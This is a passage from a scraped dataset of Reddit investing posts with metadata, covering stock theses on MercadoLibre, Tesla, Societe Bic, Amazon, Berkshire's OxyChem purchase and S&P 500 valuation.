logistics, brand trust, and scale. The e-commerce market in LatAm remains underpenetrated, with strong growth ahead: only \\~56% of adults shop online today, and per-capita spending is expected to grow at a 21% CAGR.\n\nThe fintech segment, Mercado Pago, is an even larger opportunity, with total retail payment volume in LatAm estimated at $2.35 trillion. Mercado Pago is growing off-platform payment volume faster than on-platform, and is helping drive financial inclusion in a region with low credit card penetration. MELI’s credit business leverages proprietary data from the marketplace and payment platforms to manage risk better than traditional banks.\n\n**Key drivers** include MELI’s flywheel effects — the integration of marketplace activity, logistics (Mercado Envios), and payments creates increasing user stickiness. Logistics is a strong moat: MELI operates the fastest and most reliable delivery network in the region, outperforming Amazon and newer entrants. Other potential growth drivers include insurance (leveraging marketplace data for targeted offerings) and Q-commerce (quick delivery services).\n\n**Risks** include near-term margin pressure from logistics investments, credit card expansion (especially in Mexico), and rising competition from Amazon, Shopee, and emerging players like Temu and Shein. However, the analyst argues that recent margin compression is a moat-widening investment and that MELI’s network effects, brand, and data advantages will help it maintain leadership.\n\n**Valuation is attractive:** MELI trades at 4x EV/NTM Sales, well below historical levels (it traded at 19x at the 2021 peak), while still growing revenues at \\~40% YoY. The thesis expects further margin improvement and operating leverage as the business scales, and sees MELI as a long-term compounder and a key proxy for LatAm’s accelerating digital economy.  \n\n\n# Tesla (TSLA)\n\n*Recommendation: Long*\n\n*Analyst: Landon Clay*\n\nThe market is significantly underestimating the long-term impact of autonomous driving (Full Self-Driving / FSD), the explosive potential of energy storage, and the optionality embedded in Tesla’s broader innovation pipeline (including the Optimus humanoid robot). Landon forecasts a 73% probability-weighted upside based on 6-year projections, with potential to 5x 2023 EBIT by 2030.\n\nTesla is positioned not simply as an EV manufacturer but as a vertically integrated tech ecosystem, with competitive advantages in data, manufacturing, and AI. Its massive fleet of \\~7 million cars acts as a global data collection engine for training FSD. This dataset gives Tesla an edge over competitors relying on LIDAR and HD maps. The upcoming FSD Version 13 is expected to drive higher adoption (currently sub-10%), with robotaxi ambitions potentially unlocking massive new revenue streams.\n\nThe company’s energy storage business — currently growing at \\~26% QoQ CAGR — is emerging as a second core business. Tesla already holds 20% GWh market share, and Bloomberg projects 30x growth in global energy storage by 2035. With its Shanghai Megafactory and U.S. capacity expansion, Tesla is positioned to be a top player in this market, generating high-margin recurring revenue.\n\nThe Optimus robot is a long-dated call option. While speculative, Landon notes that success here could create trillions in market value. Tesla’s AI training stack and proprietary manufacturing give it a credible path to lead in this space — though realization is likely 5–10 years out.\n\nOn the core EV business, TSLA remains the global leader in production efficiency, battery technology, and brand loyalty. The shift to the new “unboxed” production process could increase manufacturing efficiency by 40%, enabling margin expansion even as ASPs decline. The U.S. market still has significant room to grow EV penetration (currently \\~10% of new sales), and FSD success could further accelerate demand.\n\n**Key risks** include failure of FSD to reach full autonomy, key-man risk around Elon Musk, geopolitical or commodity price shocks, and potential regulatory hurdles. However, the thesis argues that Tesla’s innovation-driven culture, scale advantages, and multi-business model flywheel give it asymmetric upside compared to traditional auto peers.\n\nAt **current valuation** (with EV/EBIT multiples expected to compress from \\~116x to \\~75x), the analyst sees significant room for Tesla to compound value across its automotive, energy, and AI segments over the next decade.\n\n", "author": "GrahamQualityInv", "subreddit": "SecurityAnalysis", "score": 6, "upvote_ratio": 0.65, "num_comments": 2, "created_utc": "2025-06-15T01:40:35", "url": "https://www.reddit.com/r/SecurityAnalysis/comments/1lbd0k4/2_investment_ideas_from_columbia_business_schools/", "permalink": "https://reddit.com/r/SecurityAnalysis/comments/1lbd0k4/2_investment_ideas_from_columbia_business_schools/", "is_self": true, "domain": "self.SecurityAnalysis", "tech_keywords": ["AI", "AR", "stock", "share", "investment", "revenue", "growth", "valuation"], "crawled_at": "2025-10-03T13:57:08.152468", "sentiment_score": {"vader_compound": 0.9971, "vader_positive": 0.131, "vader_neutral": 0.84, "vader_negative": 0.029, "textblob_polarity": 0.12099422799422802, "textblob_subjectivity": 0.5434516594516592, "overall_sentiment": "positive"}},

{"post_id": "1kwbjgd", "title": "Societe Bic", "content": "Societe Bic\n\nEPA:BB \n \nMarket cap: €2.4 billion\nEV: €2.3 billion\nNet Cash: €124 million \n \nLTM PE: 11.5 \nNTM PE: 10.3\nEV/Sales 1.0\n \nROA: 7.0%\nROE: 11.6% \n\nEV/FCF of 8 \ntrailing EV/EBIT of 7.1\nforward EV/EBIT of 6.9\n\n \nSociete Bic looks too cheap for a good quality business that’s a household name with huge “mindshare” in its industries - pens, lighters, and razors. The company has a long history of innovation in common household products, and has a competitive advantage in its distribution network, which gets its products into all major consumer outlets throughout North America, Europe, and South America. \n \nIt’s trading at an EV/FCF of 8, trailing EV/EBIT of 7.1, forward EV/EBIT of 6.9, which is a big discount to comparable consumer staples in the U.S. like Edgewell Personal Care and Newell Brands, and a discount to European staples like Unilever. \n \nThe stock price has gradually drifted downwards as the razor segment saw competition from DTC competitors like Dollar Shave Club and Harry’s, worries over the long term decline in cigarette smoking, and general malaise in European equity markets. The threat of tariffs have now pushed the stock price even lower and I think this provides a good entry point. \n \nBic is entering the hairbrush market with an acquisition of an innovative product Tangle Teezer, which has similar corporate culture of making a quality household consumer product but lacked the distribution network to grow the brand as quickly as they wanted. This might be a risk as it’s outside its core competency, but might also add higher margin sales and it’s been growing at a nice 10% clip, helping to inflect growth upward.  \n \nThe business is divided into 3 segments “human expression” (mostly pens, 37% of sales), “flame for life” (lighters, 37% of sales), and “blade excellence” (razors, 25% of sales). \n \nThe pen business is the oldest and was started after Marcel Bich bought the patent to the ballpoint pen and made the first Bic crystal pen in 1950. Since then, they have continued to innovate in pens, and acquire adjacent businesses, like Wite-Out and Cello. Competitors include businesses like Sharpie and Paper Mate (owned by Newell), Staedtler (private), and Japanese companies like Pilot and Uni-ball (owned by Mitsubishi Pencil). \n \nPens is a competitive business, but Bic has a strong reputation for the cheapest products that actually write and never fail. I work in healthcare and prefer Uni-ball for note taking but I’ve had some pen failures which are frustrating. I can’t honestly ever recall a time when a Bic crystal didn’t work for me or busted in my pocket. \n \nThey added a temporary tattoo business Tattly and another Inkbox to the human expression segment, which is a bit dicey in my opinion, but the argument is that there is significant crossover in the core market for children and back to school shopping. The company recently took an asset writedown on Inkbox due to poorer than expected performance. I hope the company has learned its lesson that fads like temporary tattoos can’t match the long term power of a good consumer product but bad acquisitions remain a key risk. \n \nBic added lighters in 1973 with the first bic lighter and had just dominated the segment, with over 50% market share of lighters globally today, and over 65% of market share in lighters in the U.S. To me, the lighter business is the crown jewel and after decades of building trust and reliability, they have a significant quality advantage over any other lighter brand. I think if Bic charged me twice as much for a lighter I wouldn’t switch. \n \nBic has continued to innovate in lighters, introducing the first utility lighter in 1998, and added innovative products like pocket utility lighters in 2020, and the EZ load utility lighter in 2024, which can be reloaded with an ordinary Bic lighter. \n \nThere has been a lot of investor concern that cigarette smoking is in decline and thus lighter sales will decline. The U.S. lighter segment was down 12% in 2024 which the company explained with weakness in consumer spending (unclear to me as overall PCE did not decline in 2024) and continued trends of decreasing cigarette smoking. \n \nBut interestingly, during 2024, despite the sales slowdown, Bic actually GAINED market share, increasing by 0.2%. I find it is increasingly common to see convenience stores stocking nothing but Bic lighters. I feel like a business that can grow share in a down market is a particularly strong business, and it makes the market even more difficult to enter. \n \nMoreover cigarette smoking has continued to decline in the share of lighter use cases, helped by the addition of utility lighters. In the U.S., the largest use case for lighters (34% of lighter use) is now in candles and incense. The corporate presentations don’t break out cannabis use as a use case, but I’d also wager that cannabis use offsets some of the declines in cigarette use in lighter use cases, at least in the United States. In South America, the dominant use case is barbecue and stove top use, with over 50% of use cases for cooking and stoves. \n \nThe razor business has always been tough with entrenched competitors Gillette and Schick. Bic entered the market in 1975 with the first disposable razor. Bic has always positioned itself within razors as affordable, accessible, and disposable. Gillette has a strong presence within female razor purchases, but Bic has been a strong competitor with its Soleil brand. \n \nThe razor business was challenged in recent years with new entrants like Dollar Shave Club and Harry’s undermining a core competitive strength of distribution and targeting the very strength of the Bic razor offering - affordable, disposable razors. However Dollar Shave Club has floundered under Unilever management and has lost its initial “viral” buzz. Harry’s is a major competitor in razors now but mostly targets men and is priced higher than Bic’s segment of the razor market. Bic still has a niche in cheap, disposable razors targeted to women. \n \nThe razor business is roughly 50% Gillette, Harry’s and Schick duking it out for second place, and Bic and Dollar Shave club with about 5-10% of market share respectively. \n \nThe razor business is also the most vulnerable to tariffs, as the majority of the razors are manufactured in Greece. Tariffs could be a real risk because Bics core competitive strength is a quality razor for the lowest possible price. Corporate presentations show that Bic razors are the cheapest razor available at Wal-Mart aside from Wal-Mart’s own Equate brand, which I would argue is not considered a quality product. \n \nTangle Teezer is a recent acquisition, and I am still undecided if it is overall a positive or negative. They bought the business for €200 million, and it has €70 million of sales growing 10% per year. Tangle Teezer is priced at a premium to other hairbrushes as it uses patent-protected 2-tiered flexible teeth to minimize tugging, pulling, and breaking tangled hair. Many users like the ability to detangle without breaking hair or causing pain, but there have been reports it is not as good on fine or thin hair. \n \nThe company has primarily marketed through DTC channels and DTC is still 50% of sales, but it has been making inroads into distribution into stores. Part of the rationale for Bic’s acquisition is to leverage its strengths in distribution to get Tangle Teezer into all the stores where Bic is sold to grow the company faster.  \n \nFurthermore, the higher priced product (with low cost to manufacture) means Tangle Teezer is accretive to margins at Bic. \n \nI am a bit worried as hairbrushes are outside of Bic’s core competencies, however the company has justified it as having a like minded consumer culture. The culture at Bic has always been to innovate on quality consumer products into household goods, so they argue Tangle Teezer is a good fit on culture. \n \nManagement and corporate governance is a bit of a question mark at this point. Bic has had 3 generations of CEOs from the Bich family, and the family still controls 60% of the shareholder vote. Gonzales Bich has announced his intention to step down at the end of this year and the company has begun a search for an outside CEO. Empirical studies find that family controlled firms that bring in outside CEOs tend to perform better than those that stay in family control, because of the theory that drawing from a “larger pool” of talent brings in better management. We will see who gets chosen at the end of 2025. In the meantime, the Bich family still controls the board and can ensure that the founding culture of innovation in household products is maintain. \n \nTariffs are a significant concern. The geographic breakdown of sales is 37% North America, 32% Europe, and 19% Latam. There is a very small presence in Africa, Middle East, and Asia, with only 12% of sales combined. \n \nThe company historically hasn’t done the best job at turning over inventory. Manufacturing is spread across the globe, and days inventory in the 180s generally runs a lot higher than competitors like Edgewell (historically at 90-100, ran up to 145 in preparation for tariffs), Newell (historically 80-90, now at 120), and Unilever (historically 40-50, now at 56). However this excess inventory might actually turn out to be an advantage in a tariff war, because the company can run down pre-tariff inventory (depending on where the inventory is stored) to avoid price hikes until the tariff situation is clarified. \n \nThe company makes about 50% of its lighters in France, but it does do a portion of lighter manufacturing in the U.S., which gives it a toehold if they want to increase U.S. lighter production to avoid tariffs in the future. A huge portion of pens and stationary are made in Mexico and are USMCA compliant, so they are exempt from tariffs under USMCA. Razors are challenged as a significant portion are made in Greece which will be subject to whatever EU tariff is decided upon. \n \nThe fact that 60-70% of sales are outside the U.S. does give it a fair amount of insulation from tariff impacts. Lighters are disproportionately US exposed, but the strong brand share in the U.S. gives it cover to hike prices to offset the tariffs in the U.S. \n \nTangle Teezer is predominantly manufactured in the UK, which already has a tariff agreement with the U.S. \n \nThe valuation versus comps like Newell, Edgewell, and Unilever is compelling. For reference, the following metrics:\n \nEdgewell: \nLTM PE 15.9 \nNTM PE 8.7 \nEV/Sales 1.1 \nROA: 4.0% \nROE 5.5%, historically mid single digits, despite debt/EBITDA of 3.8 \nTrailing EV/EBIT 10.9 \nForward EV/EBIT 10.2\n \nNewell: \nLTM PE: negative earnings \nNTM PE: 7.9 \nEV/Sales: 1.0 \nROA: 2.8% \nROE: not directly comparable due to negative equity from buybacks \nTrailing EV/EBIT: 14.8 \nForward EV/EBIT: 11.6 \n \nUnilever: \nLTM PE: 26.7 \nNTM PE: 18.5 \nEV/Sales: 2.7 \nROA: 9.1% \nROE: 29% \nTrailing EV/EBIT: 16.2 \nForward EV/EBIT: 14.7 \n \nFor completeness, I’ll also put down some metrics for Pilot and Mitsubishi Pencil, but FWIW I also think these are too cheap mainly because they are Japanese.\n \nPilot \nLTM PE: 10.7 \nNTM PE: unavailable \nEV/Sales: 0.85 \nROA: 7.1% \nROE: 10.5% \nLTM EV/EBIT: 6.0 \nForward EV/EBIT: 6.2 \n \nMitsubishi Pencil (owner of Uni Ball) \nLTM PE: 11.0 \nNTM PE: unavailable  \nEV/Sales: 1.0 \nROA: 4.3% \nROE: 8.7% \nLTM EV/EBIT: 8.3 \nForward EV/EBIT: 7.1 \n \nSociete Bic actually looks much cheaper when looking at cash flow than earnings or EBIT metrics. The company aggressively depreciates assets and recently had an asset write down of its Inkbox acquisition which distorts the earnings picture. Depreciation and amortization has consistently run €20-30 million over capex since about 2019 or so. The company may have to do some capex if it decides to build out more U.S. manufacturing. \n \nThe company focuses on FCF generation as a key metric, which is something I look for as a shareholder. The company has €280 million trailing FCF and forecasts at least €250 million FCF this year. This puts it at a trailing P/FCF of 8.6x and a forward P/FCF of at least 9.5. It also means you earn a 10% “cash flow yield” at these prices. The EV/FCF is a bit lower as the company has net cash on its balance sheet (unlike most comps in the sector, which typically have high debt loads). \n \nThe company pays out a 5.3% dividend (useless to me as an American investor but maybe useful to European investors) and aims to pay out 40-50% of EPS each year as a dividend. The company has a plan to buyback €40 million per year, which I hope gets ramped up. \n \nThe company also seeks to do an acquisition about every other year. Historically, most of Bic’s acquisitions have been pretty good, in directly adjacent businesses like stationary businesses, pen companies like Cello, and lighter companies. The temporary tattoo acquisition was a notable misstep. Tangle Teezer was too recent (2024) to tell if it will work out or not, but the rationale of culture fit and distribution access makes a lot more sense to me as an investor. \n \nI think overall, it’s a business that is pretty decent, with a highly defensible “crown jewel” in the lighter business, and ought to rerate to a mid-teens multiple on an EV/EBIT basis like other consumer staple companies. It’s got better return on capital metrics than companies like Edgewell and Newell yet trades at a much lower multiple. A 13x EV/EBIT multiple would put the share price at €100, which would be a 73% return from current prices. \n \nAt this multiple it’s hard for me to see too much downside from current prices, and especially if you are a European investor exempt from U.S. dividend tax laws, you get paid a nice dividend to wait for a rerating. \n \nThe balance sheet is also significantly underlevered versus many consumer staple businesses and there’s an opportunity for an outside CEO to ramp up buybacks by taking on a bit of leverage, which would goose the ROE and push prices higher.

Below are the fund’s top 10 positions. With five holdings each representing more than 10% of assets, it’s fair to say the fund is highly concentrated.\n\nhttps://preview.redd.it/8u67qe29ij2f1.png?width=424&amp;format=png&amp;auto=webp&amp;s=23896a6eb5ecf603b742ae4775b4517fcd36d110\n\nSource: [whalewisdom.com](http://whalewisdom.com)\n\nOne pattern that stands out is the balanced mix of asset-heavy and asset-light business models—yet all are dominant players in their respective markets:\n\n* **Asset-heavy models** like Canadian Pacific (CP), Canadian National (CN), and Ferrovial (which operates toll roads and airports) are essentially **natural monopolies.**\n* **Asset-light tech giants** like Alphabet and Microsoft command over 50% market share in their core businesses—**modern-day digital monopolies**.\n* **Moody’s and S&amp;P Global**, the leading rating agencies, are foundational to the financial system and operate in highly consolidated markets—similar to **Visa** in payments.\n* **GE Aerospace**, the fund’s largest position, deserves its own mention. It’s the leader in commercial aircraft engines with an estimated 50% market share. Hohn is negative on airlines but still wants exposure to the secular growth in air travel—GE lets him monetize that trend without the margin pressure of the airline industry.\n\n**Next week**, we’ll attempt to reconstruct the 200-stock investable universe Hohn referred to. I’m convinced it will include many thematic winners.\n\n...\n\nAnd here’s a quick breakdown of that amazing podcast with Chris Hohn from The Children’s Investment Fund.\n\n* **Start with moats, not growth** Moats &gt; growth. Hohn only invests in businesses with *true* barriers to entry (network effects, IP, switching costs). No moat = no thanks.Examples: Aena (airport monopoly), GE/Safran (jet engines), Meta/Visa (network scale).\n* **Essential &gt; discretionary** He likes irreplaceable businesses with pricing power — like ratings agencies or infrastructure. If you *have* to use it and they can raise prices above inflation, he’s interested.\n* **No “profitless growth”** Airlines grow 5% a year… and barely make money. He avoids low-margin and overhyped businesses with no real earnings power.\n* **Blacklist of bad industries** Hohn avoids sectors with high competition and little pricing power: ✘ Banks ✘ Autos ✘ Retail ✘ Insurance ✘ Airlines ✘ Commodities ✘ Media ✘ Asset managers, etc. His investable universe is only \\~200 stocks globally.\n* **Long-term mindset** TCI holds stocks for 8+ years. DCF &gt; multiples. It’s all about compounding intrinsic value, not trading around short-term noise.\n* **High conviction, concentrated bets** 10–15 stocks. Top 5 = 72% of the portfolio. Deep research + decades of experience = strong intuition.\n* **Philanthropy at the core** Hohn donates nearly all his earnings.

But one industry held up remarkably well: Gaming! 🚀\n\nThe **VanEck Video Gaming and eSports ETF** (ticker: ESPO) delivered strong returns across both time horizons — the challenging Q1 2025 and the broader 2022–2024 period.\n\n(picture)\n\nDespite broader pressure on consumer sentiment and tech multiples, gaming showed resilience — supported by strong brand IP, recurring revenues, and enduring demand for interactive entertainment. When a segment shows strength in two very different market environments, it often points to something deeper: a **secular growth story** worth understanding.\n\nWe want to understand this industry better — how it works, where each company plays, and where the most investable opportunities lie. To do that, we want to built an **industry map**. How can we do this and what would be a good tool to do this methodically?\n\n# What’s an Industry Map — and Why Use One?\n\nThink of an industry map as a **visual x-ray** of a market. It helps answer key questions like:\n\n* What are the business models in this space?\n* Where in the value chain does each player operate?\n* Who is vertically integrated? Who’s focused on a niche?\n* Where does the money flow?\n\nOne helpful way to frame it comes from [Michael Mauboussin and Dan Callahan in their excellent piece, “Measuring the Moat” (Morgan Stanley):](https://www.morganstanley.com/im/publication/insights/articles/article_measuringthemoat.pdf)\n\n&gt;\n\nThey included an industry map for the U.S. airline industry — which isn’t really driven by a secular growth trend — and I also believe the visualization could be more informative. For instance, major players like airports are missing entirely. I think we can do better, and I’d love your feedback.\n\n(picture)\n\n# A Better Use Case: Gaming Industry Map (Simplified)\n\nHere’s a **simplified industry map** I built for the gaming sector.\n\n[Link to PDF](https://drive.google.com/file/d/1GCiL2iRu1EQaMjzrct3AX6dNeozw_Yfw/view?usp=sharing)\n\nThis version captures the **core business models**. The logos indicate which companies are active in each field:\n\n* **Nintendo** is a pure-play gaming company operating as a *Vertically Integrated Ecosystem*. It develops, publishes, owns the platform, and also sells the hardware — most notably, the Nintendo Switch.\n* The same is true for **Sony**, which owns the PlayStation ecosystem. However, the key difference lies on the right side of the table: Sony also generates significant revenue from *non-gaming* segments. So while its gaming business is structurally similar to Nintendo’s, it is **not** a pure play, also visible via the lower “Megatrend Exposure”.\n* **Take-Two**, the company behind the Grand Theft Auto (GTA) franchise, is a pure-play *developer and publisher*. Its DNA is creating compelling gaming content, which is then monetized through platforms like Nintendo (Switch), Sony (PlayStation), or Microsoft (Xbox).\n* **Logitech** and **Corsair** fall into the *hardware* category, providing physical gaming gear and accessories to players and streamers alike.\n* You might know the saying, *“During a gold rush, sell shovels.”* That’s exactly what **AppLovin** and **Unity** are doing. They are *infrastructure* plays — enabling developers to monetize games via advertising tech, or supporting them with development tools and game engines.\n\nYou can immediately see **who plays where** and who may benefit most from digital trends, cross-platform IP, and rising monetization sophistication.\n\n# Going Deeper: Gaming Value Chain Exposure\n\nHere’s a more detailed version. This is how I would structure a market map for my own reference — something I’d keep on my desk.\n\n[Link to PDF](https://drive.google.com/file/d/1GcBWvY_HlFJFuIVHEGZcRpqQEV4_EW_S/view?usp=sharing)\n\nThe main differences include:\n\n* Revenue breakdowns by segment\n* A few examples of key products and services\n\n# What Else Would Add Value?\n\nI see this industry map as a first step toward identifying compelling stocks and segments within gaming. The natural next step, to me, is to dig into the financials and assess which parts of the industry are more profitable or growing faster than others. I’d be looking at:\n\n* Long-term revenue growth patterns\n* Differences in margin structures and return on capital profiles\n* Whether this translates into superior shareholder returns\n\nSuch a **benchmarking deck** would help pinpoint which business models and companies are most attractive for long-term ownership.\n\nOnce you’ve shortlisted the stocks to prioritize, you’ll probably want to gather additional insights — such as:\n\n* Deep-dive investment cases\n* Podcasts explaining the industry landscape\n* Interviews with senior executives\n\nWould a curated list of this kind of content be helpful?\n\n# Please Let Me Know\n\n* Is the simplified industry map too basic — or just right?

The Oct. 2 deal is the first-ever Berkshire announcement that quotes incoming CEO Greg Abel and doesn’t mention the current chief executive by name.\n\nThe OxyChem business will operate as a strong stand-alone for Berkshire, while the deal should boost Berkshire’s nearly 30% ownership of parent Oxy because the Houston company will use the bulk of the proceeds to pay off the high debt load that’s dragged down its stock in recent years, said Doug Leggate, Wolfe Research energy analyst.\n\n“It’s genius. It’s certainly a win-plus for Berkshire because it also helps the company that they own 30% of,” Leggate said. “It’s completely self-serving, it’s logical, and—not in any nefarious way—definitely helpful.”\n\nThe $9.7 billion, all-cash OxyChem deal is Berkshire’s largest since scooping up insurance player Alleghany in 2022. In recent years, Berkshire has focused on selling off stakes of its investments and is sitting on a whopping mound of almost $350 billion in cash.\n\nLeggate called OxyChem a steady potential cash cow that focuses on its growing chlor-alkali business manufacturing PVC (polyvinyl chloride) resin for piping, construction materials, medical equipment, and more. Its business largely moves with the housing market, which could soon benefit more from falling interest rates. “It’s a low-volatile, uncontroversial, niche business that has pricing power given the market structure,” he said.\n\nThe 95-year-old Buffett announced his retirement plans in May, although Abel has long been tapped as his eventual successor.  Abel, the longtime Berkshire vice chairman of noninsurance operations, praised the OxyChem deal and Oxy CEO Vicki Hollub in the announcement.\n\n“Berkshire is acquiring a robust portfolio of operating assets, supported by an accomplished team,” Abel said in the announcement. “We look forward to welcoming OxyChem as an operating subsidiary within Berkshire. We commend Vicki and the Occidental team for their commitment to Occidental’s long-term financial stability, as demonstrated by their plan to use proceeds to reinforce the company’s balance sheet.”\n\nBerkshire did not immediately respond to interview requests.\n\nSpecifically, Oxy said, it will use $6.5 billion of the proceeds to reduce debt and bring its principal debt below the $15 billion target it set following the late 2023 acquisition of Permian Basin oil producer CrownRock for $12 billion.  Hollub said the deal helps Oxy focus on its core oil and gas business, especially in the booming Permian, while strengthening its financial position through debt reduction.\n\nOxyChem represents almost 20% of Oxy’s total pretax income, bringing in more than $1 billion annually.\n\n**The Berkshire-Oxy courtship**\n\nThe intimate Berkshire-Oxy relationship dates back to 2019 when Oxy entered a dramatic bidding war with the much larger Chevron to acquire oil producer Anadarko Petroleum.  Anadarko had chosen to sell to Chevron when Oxy came back with a larger $38 billion offer that included much more cash—too good for Anadarko to turn down.\n\nThat offer only came to fruition when Hollub took a whirlwind trek to Omaha to see Warren Buffett and his Berkshire team. After a 90-minute meeting, Buffett committed $10 billion to finance the merger in exchange for preferred shares and a stake in the expanded Oxy.\n\nThe agreements allowed Oxy to boost its cash offer to about 80% of the purchase price in its successful David-versus-Goliath bidding war against Chevron.\n\nSince then, Buffett has increased Berkshire’s stake in Oxy to more than 28%.\n\nBut in the meantime, the big acquisitions left Oxy with a much greater debt load, especially going into the pandemic in 2020. Oxy barely survived the downturn, slashing its dividend from 79 cents per share each quarter down to just one penny. Since then, the dividend has risen back up to 24 cents—still much lower than in 2019.\n\nThe OxyChem deal largely solves the debt problem, although Oxy won’t begin redeeming Berkshire’s preferred shares—and their 8% annual interest—until 2029.\n\n“In a world where crude \\[pricing\\] is softening, Oxy has too much debt. It’s unequivocal that it’s a good thing for Oxy to raise cash and pay down debt,” said Dan Pickering, founder and chief investment officer of Pickering Energy Partners consulting and research firm.\n\nWhile Abel may already be in the dealmaking driver’s seat for Berkshire, Pickering said, “\\[Buffett\\] was the driver of the original Oxy investment, so I’m sure he was involved.”\n\nPickering compared Berkshire’s likely double win for both OxyChem and Oxy to a “circular loop” like the booming AI sector’s recent investments in one another’s companies: “AI is in a circular loop where Nvidia gives money to somebody, who gives money to somebody, who gives it back to Nvidia.”\n\nThe only problem for Oxy on Oct. 2, though, was its stock surprisingly fell by 7%. Oxy had outperformed the S&amp;P Oil &amp; Gas Exploration &amp; Production ETF by about 2.5% this week through Oct. 1, largely baking in the deal before the Oct. 2 announcement.\n\nOxy is selling its chemicals business at a bit of a discount when the broader petrochemical sector is near a cyclical trough.\n\nPickering said there was some “sell the news dynamic” at play. But the sale also diminishes some hopes that Berkshire would buy Oxy in its entirety, potentially hurting the stock.\n\n“By buying these pieces, the odds that he’s going to buy it all have gone down,” Pickering said.\n\nA year ago, this reporter asked Hollub at what point Berkshire might control too much Oxy stock. Her response: “We would never consider it to be too much.”", "author": "NoDontClickOnThat", "subreddit": "ValueInvesting", "score": 120, "upvote_ratio": 0.95, "num_comments": 12, "created_utc": "2025-10-03T07:51:37", "url": "https://www.reddit.com/r/ValueInvesting/comments/1nwinqk/warren_buffetts_berkshire_hathaway_may_have/", "permalink": "https://reddit.com/r/ValueInvesting/comments/1nwinqk/warren_buffetts_berkshire_hathaway_may_have/", "is_self": true, "domain": "self.ValueInvesting", "tech_keywords": ["AI", "AR", "VR", "stock", "share", "investment", "portfolio", "merger", "acquisition", "dividend"], "crawled_at": "2025-10-03T13:57:08.363701", "sentiment_score": {"vader_compound": 0.9859, "vader_positive": 0.09, "vader_neutral": 0.865, "vader_negative": 0.046, "textblob_polarity": 0.13478099256580267, "textblob_subjectivity": 0.44321277878239906, "overall_sentiment": "positive"}},

However, we have a P/E over 31, and a Shiller P/E over 40, history tells us this won't end pretty.\n\nLets look at the numbers and model out the scenarios, to see what we can expect for returns.  \nFor this model we need a low, medium and high terminal P/E (what P/E will the S&amp;P 500 end at in 10 years)  \nand we need low, medium and high estimated earnings growth numbers.\n\nHistorically P/E has a median of 15, this is too low since it goes back to the 1800s, but in the past 50 years, the P/E median is \\~20, in the past 20 and 10 years, it's \\~25.\n\nSo let's go with:\n\n* low: 20\n* mid: 25\n* high: 30\n\nFor growth estimations I looked at the past 20 years of earnings, 50% of the years were below or equal to 4% CAGR, which means this is most likely, and 20% of the years were above or equal to 8% CAGR.\n\nTo give some room for more expected growth, let's go with:\n\n* low: 4%\n* mid: 6.5%\n* high 10% (only seen 4 times since 1880)\n\n*(Note: these aren’t conservative.)*\n\nWe now can get the terminal value:\n\nTerminal value = current EPS \\* (expected growh rate)\\^10 years  \ncurrent EPS = 219.52\n\nFrom here we can see what Compounded Annual Growth Rate will get to the current share price from the terminal value in 10 years. For my estimations I get the following annual returns from the estimations:\n\n* high: \\~9% annual return\n* mid: \\~4.7% annual return\n* low: \\~1% annual return\n\nThis shows another picture of what is preached about 10% annual returns.\n\n**Before the AI bulls comment, please read the section in my article about AI.**\n\nThe S&amp;P 500 is priced for perfection.

Which is a fair fear to have, however they are so deeply integrated with customers that it will be hard to rip off FactSet and replace them with a new startup. FactSet has tons of historical data and expertise in financial data market, I would expect the management to innovate to fend off competitors. \n* I would like to call out that FactSet by no means is offering margin of safety like my previous investments in baba, meta, bti, and others.

{"post_id": "1nvuluv", "title": "AMZN is cheaper than you think", "content": "So I'm sure many people are looking at AMZN's P/E ratio of 33.7x and thinking that while it's more reasonable than it used to be, it's still pretty expensive. Especially when you can pickup shares of GOOGL or META at 26x. But I think a useful valuation metric to look at is the price to operating cash flow and I'll explain why.\n\nNet income is an accounting metric that includes depreciation and amortization, and it's up to the business to decide the schedule for those, meaning they can decide, for example, that the useful life of a GPU is 6 years when in reality it's probably 2 years. Another problem is that GAAP requires companies to mark to market any investments each quarter, meaning that if a company holds shares of a different company, the change in price effects net income.\n\nThis is why investors run discounted cash flow models, because ultimately cash is what matters--not accounting results. The value of a business is the present value of the future cash you can extract from the business over its life. The problem with using free cash flow is that capex is part of the equation, and capex is highly variable year to year. Some years you may buy a new office building and a new warehouse and a bunch of warehouse equipment, and other years you might not buy anything.\n\nOperating cash flow removes capex from the equation which allows you to simply focus on how much cash the business actually produces from its operations. Not paper gains of a stock they hold, or because they chose to extend the useful life of their assets. Just the operations.\n\nSo on a price to trailing twelve month P/OCF ratio, here are the results for the Magnificent 7 stocks:\n\n* TSLA: 91.3x\n* NVDA: 59.0x\n* AAPL: 34.9x\n* MSFT: 28.3x\n* GOOGL: 22.1x\n* AMZN: 19.4x\n* META: 17.6x\n\nNow you might think this is stupid because free cash flows are what matter. Who cares if your operating cash flow is great but you need to spend it all on capex to continue generating the cash flow? While this is true, I think it's useful to compare just the operating businesses as capex is highly variable and is a choice that doesn't need to be made in perpetuity. Now of course, AMZN is by far the most structurally capital intensive (besides TSLA? maybe?) since they actually move real stuff in the real world so that needs to be taken into consideration. \n\nAnyway, just thought I'd share. I think understanding the price you're paying relative to the cash generated by operations is useful and should be considered when evaluating a business' valuation.

The businesses' filings doesn't give the updated balance sheet report, but I found the updated working capital in the foot notes. based on the 2024 filing, I can see they have no long term liabilities, so this working capital number I found is the up to date liquidation value of the business.\n\n**These figures are in (CAD)**\n\n* $56,000 in cash\n* $2,000,000 in deposits\n* $106,000 in liabilities\n* NCAV(liquidation value): $1,950,000\n* Market Cap: $1,050,000\n* Share Price: $0.065\n* Under Valued: by 46%\n\n**Risks**\n\nPossible current share dilution authorized for the management is 8%.\n\nThe real risk of this shell style business is slow burn of cash over time. If we estimate a 300k burn a year, this business is still at a liquidation value of 1.35M in 2 years, at which point I'd sell it if the management didn't make any meaningful change.\n\n**Predicted Outcome**\n\nThe most likely outcome is a slow burn of cash over a year, then the business acquires another business and improves/continues operation. In this case, the business will be 36% under valued when it unlocks value for the shareholders, which would be a 57% return.\n\nThe next most likely is that they have a merger/acquisition sale to another business, or liquidate their business.\n\n* If they do it immediately, the return is an 86% return.\n* If they wait a year before doing this, it will be a 57% return.\n* If they wait 2 years before doing this, it will be a 29% return.\n\nMy position size is 5.5% of my capital, and I plan on holding onto this stock for 2-3 years, or until the market cap gets close to the NCAV(liquidation value).", "author": "Aubstter", "subreddit": "ValueInvesting", "score": 3, "upvote_ratio": 1.0, "num_comments": 11, "created_utc": "2025-10-03T06:53:08", "url": "https://www.reddit.com/r/ValueInvesting/comments/1nwh991/little_ben_graham_cigarbutt_if_youd_like_a_puff/", "permalink": "https://reddit.com/r/ValueInvesting/comments/1nwh991/little_ben_graham_cigarbutt_if_youd_like_a_puff/", "is_self": true, "domain": "self.ValueInvesting", "tech_keywords": ["AI", "AR", "stock", "share", "merger", 